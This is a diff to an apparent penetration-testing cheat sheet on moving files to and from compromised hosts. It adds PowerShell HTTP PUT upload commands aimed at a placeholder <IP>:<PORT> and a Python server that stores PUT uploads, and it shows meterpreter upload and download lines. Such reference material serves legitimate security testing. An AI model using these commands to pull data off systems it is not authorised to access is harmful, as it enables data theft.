@@ -6,7 +6,7 @@ using the built-in `md5sum`.
 On Windows, the PowerShell cmdlet `Get-FileHash -Algorithm MD5` can be used to
 compute the MD5 file's hash.
 
-### Server side
+### Server side / file sender
 
 The following tools can be used to host files server side.
 
@@ -110,7 +110,21 @@ mkdir <TFTPFOLDER>
 atftpd --daemon --port <PORT> <TFTPFOLDER>
 ```
 
-### Client side
+###### [Windows] PowerShell HTTP PUT request
+
+The PowerShell cmdlets `Invoke-WebRequest` and `Invoke-RestMethod` can be used
+to send a file, or directly a variable content, through a HTTP PUT request to
+a webserver (that should process the request and store the received PUT body):
+
+```
+Invoke-WebRequest -Method PUT -Uri "http://<IP>:<PORT>/<FILE>" -Infile <FILE_PATH>
+Invoke-RestMethod -Method PUT -Uri "http://<IP>:<PORT>/<FILE>" -Infile <FILE_PATH>
+
+Invoke-WebRequest -Method PUT -Uri "http://<IP>:<PORT>/<FILE>" -Body <$VARIABLE>
+Invoke-RestMethod -Method PUT -Uri "http://<IP>:<PORT>/<FILE>" -Body <$VARIABLE>
+```  
+
+### Client side / file receiver
 
 The following tools can be used to download file from a server client side.  
 
@@ -374,7 +388,7 @@ tftp -i <SERVERIP> GET <FILENAME>
 
 ###### [Linux] SCP
 
-The Linux `Secuyre Copy` utility can be used to transfer files over SSH and
+The Linux `Secure Copy` utility can be used to transfer files over SSH and
 can notably be used to retrieve and upload files from a compromised target
 exposing a SSH service.  
 
@@ -400,4 +414,66 @@ meterpreter> download -r <DIRECTORY>
 
 meterpreter> upload <FILENAME>
 meterpreter> upload -r <DIRECTORY>
+```
+
+###### [Linux / Windows] Python webserver processing PUT requests
+
+The following Python code extends the Python `SimpleHTTPServer` module to
+process HTTP PUT request and store, in the directory the script was started,
+the PUT request body content as a file. The filename is specified in the URL
+requested.   
+
+Original author: Floating Octothorpe,
+`https://f-o.org.uk/2017/receiving-files-over-http-with-python.html`.
+
+```
+#!/usr/bin/env python
+
+"""Extend Python's built in HTTP server to save files
+
+curl or wget can be used to send files with options similar to the following
+
+  curl -X PUT --upload-file somefile.txt http://localhost:8000
+  wget -O- --method=PUT --body-file=somefile.txt http://localhost:8000/somefile.txt
+
+__Note__: curl automatically appends the filename onto the end of the URL so
+the path can be omitted.
+
+"""
+import os
+try:
+    import http.server as server
+except ImportError:
+    # Handle Python 2.x
+    import SimpleHTTPServer as server
+
+class HTTPRequestHandler(server.SimpleHTTPRequestHandler):
+    """Extend SimpleHTTPRequestHandler to handle PUT requests"""
+    def do_PUT(self):
+        """Save a file following a HTTP PUT request"""
+        filename = os.path.basename(self.path)
+
+        # Don't overwrite files
+        if os.path.exists(filename):
+            self.send_response(409, 'Conflict')
+            self.end_headers()
+            reply_body = '"%s" already exists\n' % filename
+            self.wfile.write(reply_body.encode('utf-8'))
+            return
+
+        file_length = int(self.headers['Content-Length'])
+        with open(filename, 'wb') as output_file:
+            output_file.write(self.rfile.read(file_length))
+        self.send_response(201, 'Created')
+        self.end_headers()
+        reply_body = 'Saved "%s"\n' % filename
+        self.wfile.write(reply_body.encode('utf-8'))
+
+if __name__ == '__main__':
+    server.test(HandlerClass=HTTPRequestHandler)
+```
+
+```
+# Works with Python2 and Python3
+python http_put_server.py
 ```
